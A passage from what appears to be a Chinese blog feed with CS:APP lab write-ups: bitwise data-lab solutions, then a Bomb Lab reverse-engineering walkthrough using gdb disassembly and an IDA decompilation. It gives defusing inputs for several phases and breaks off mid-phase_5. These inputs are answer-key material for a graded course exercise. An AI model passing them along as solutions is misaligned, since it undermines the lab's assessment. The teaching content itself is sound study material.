title="isAsciiDigit"></a>isAsciiDigit</h2><p>思路大体上分为两部分<br>第一个是前28位，必须是0x3，异或判断即可<br>第二个是后4位，逻辑如下（或的思维）：<br>要么最高位是0（范围锁定在0x0 - 0x7）<br>要么第二三位是0（范围锁定在0x8 - 0x9）<br>然后用!运算的思维相与即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>)) &amp; (!((x &lt;&lt; <span class="number">28</span>) &gt;&gt; <span class="number">31</span>) | !((x &lt;&lt; <span class="number">29</span>) &gt;&gt; <span class="number">30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>实现一个x ? y : z 条件运算符</p><p>逻辑是，如果x不为0则返回y，否则z</p><p>那么可以用异或来做，思路初步是这样的，因为x是不确定的数，但是在逻辑中只有0和非0，所以我们可以采用两次!!操作符让他变成非0和0的两个仅有的情况(0x00000000和0x00000001)</p><p>使用<code>~x + 1</code>可以让两种情况分别为0x00000000和0xffffffff，然后再用异或处理即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((~(!!x) + <span class="number">1</span>) &amp; y) ^ ((~(!x) + <span class="number">1</span>) &amp; z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><h1 id="反馈总结"><a href="#反馈总结" class="headerlink" title="反馈总结"></a>反馈总结</h1><ol><li>判断在某个区间擅用异或操作</li><li>以二进制的角度看待问题</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bomb Lab</title>
      <link href="2021/06/15/BombLab/"/>
      <url>2021/06/15/BombLab/</url>
      
        <content type="html"><![CDATA[<p>实验说明：</p><blockquote><p>A “binary bomb” is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server. Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. It’s also great fun. A legendary lab among the CMU undergrads.</p></blockquote><p>是个逆向的小游戏，我们使用gdb来做</p><p>反汇编一下main函数，可以大概看到有很多的phase，我们需要逐个拆除<br><img src="https://i.loli.net/2021/06/15/QzuaNr1OUdfVMqw.png" alt=""></p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p><img src="https://i.loli.net/2021/06/15/aiNtKRXkTMzxuAY.png" alt=""><br>反汇编可以看到在phase_1里面调用了一个strings_not_equal的函数，猜测如果两个字符串不相等就会爆炸，x64下程序通过rsi传入第二个参数，我们看一下具体的内存值即可。<br><img src="https://i.loli.net/2021/06/15/oKE52W9rqa6IjAR.png" alt=""></p><p>运行程序，发现可以不被引爆</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>反汇编phase_2<br><img src="https://i.loli.net/2021/06/15/5UmbPSIHk1XFpd9.png" alt=""></p><p>可以看到后面有个jne指令向上跳转，所以肯定是个循环结构，在上面是个read_six_numbers，读入6个数字，所以猜测对每个数字都有要求，并且通过动调可以发现cmp那条指令要求第一个数字为1</p><p><img src="https://i.loli.net/2021/06/15/BHQwntopNq5by4S.png" alt=""><br>读入六个数字，否则就退出程序</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br></pre></td></tr></table></figure><p>这个位置动态调试可以发现是后面的数据是否等于前面数字的二倍</p><p>那么payload应该就是1 2 4 8 16 32了<br>可以通过验证</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400f4c</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line"> <span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> <span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"> # 读入数据要是<span class="number">2</span>个</span><br><span class="line"> <span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0x7</span></span><br><span class="line"> # 第一个读入的数据不能超过<span class="number">7</span></span><br><span class="line"> <span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>*<span class="number">8</span></span><br><span class="line"> +<span class="number">0x402470</span>]</span><br><span class="line"> # 寻址到不同的分支</span><br><span class="line"> <span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xcf</span></span><br><span class="line"> <span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2c3</span></span><br><span class="line"> <span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x100</span></span><br><span class="line"> <span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x185</span></span><br><span class="line"> <span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xce</span></span><br><span class="line"> <span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2aa</span></span><br><span class="line"> <span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x147</span></span><br><span class="line"> <span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x137</span></span><br><span class="line"> <span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>目测看起来像个Switch结构，关键点给出注释，中间通过读入的数字到eax里面进行寻址<br>比如我要输入的第一个数字是7，那么查看地址如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x4024a8</span></span><br><span class="line"><span class="number">0x4024a8</span>:<span class="number">0x00400fa6</span></span><br></pre></td></tr></table></figure><br>可以发现会执行<code>mov eax,0x147</code>，然后jmp到cmp指令，将sscanf读入的第二个参数和该参数相比较，那么第二个我们输入0x147即可通过验证</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">7 327</span><br><span class="line">Halfway there!</span><br></pre></td></tr></table></figure><p>这是截止到目前的程序输出</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   <span class="number">0x000000000040100c</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401010</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0000000000401015</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040101a</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line">   <span class="number">0x000000000040101f</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401024</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401029</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040102c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040102e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0xe</span></span><br><span class="line">   # 第一个参数需要小于<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x0000000000401033</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401035</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040103a</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040103f</span> &lt;+<span class="number">51</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401044</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401048</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line">   # 调用func4函数继续处理，第一个参数为我们输入的第一个值，第二个参数是<span class="number">0</span>，第三个参数是<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040104d</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040104f</span> &lt;+<span class="number">67</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401051</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401056</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">je</span>     <span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;</span><br><span class="line">   # 返回值和第二个参数都必须为<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401058</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040105d</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401061</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>可以看到还是常规的首先比较参数个数，需要两个，并且第一个参数需要不能大于0xe</p><p>func4函数如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"> # <span class="number">0xe</span></span><br><span class="line"><span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="built_in">ecx</span>,<span class="number">0x1f</span></span><br><span class="line"><span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">rax</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"># 第一轮循环：<span class="built_in">ecx</span> = (<span class="number">0xe</span> &gt;&gt; <span class="number">0x1f</span> + <span class="number">0xe</span>) &gt;&gt; <span class="number">1</span>，然后和我们输入的第二个参数比较</span><br><span class="line"><span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">rcx</span>-<span class="number">0x1</span>]</span><br><span class="line"># 第三个参数：[<span class="built_in">rcx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">esi</span>,[<span class="built_in">rcx</span>+<span class="number">0x1</span>]    </span><br><span class="line"><span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>一个递归函数，有点绕。。。<br>借助一下ida - - (我好菜<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (a3 - a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * func4(a1, a2, (v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a1 )</span><br><span class="line">    result = <span class="number">2</span> * func4(a1, (v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>很清晰，不能大于不能小于，必须等于（当然在递归中等于也可以<br>仔细想想，这不就是二分查找吗（x<br>所以只要能被二分查找发现的都可以</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>汇编代码如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>],<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line"># 比较字符串长度</span><br><span class="line"><span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="built_in">rax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>],<span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>]</span><br><span class="line"><span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="built_in">edx</span>,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x4024b0</span>]</span><br><span class="line"><span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x10</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x1</span></span><br><span class="line"># 每次+<span class="number">1</span></span><br><span class="line"><span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="number">0x6</span></span><br><span class="line"># 循环<span class="number">6</span>次</span><br><span class="line"><span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span 